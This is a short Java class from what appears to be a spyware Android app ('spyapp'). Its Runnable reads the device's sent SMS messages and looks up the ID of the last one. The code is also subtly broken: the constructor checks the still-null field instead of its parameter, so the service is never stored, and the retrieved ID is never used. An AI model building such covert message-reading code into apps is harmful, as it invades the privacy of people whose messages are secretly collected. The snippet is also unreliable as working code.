package com.example.spyapp.sent_sms_handler;
import org.json.JSONObject;

import com.example.spyapp.Services;
import com.example.spyapp.sms.SMSUtil;



public class SMS_SentHandler implements Runnable {

	Services services;
	
	public SMS_SentHandler(Services service) {
		// TODO Auto-generated constructor stub
		if(services!=null){
			this.services=service;
		}
	}
	
	@Override
	public void run() {
		// TODO Auto-generated method stub
		 JSONObject lastSentMessage=SMSUtil.getInstance().getSentMessageList(services);
		 long id=SMSUtil.getInstance().getLastSentMessage(services,lastSentMessage);
	}

	
	
		
}
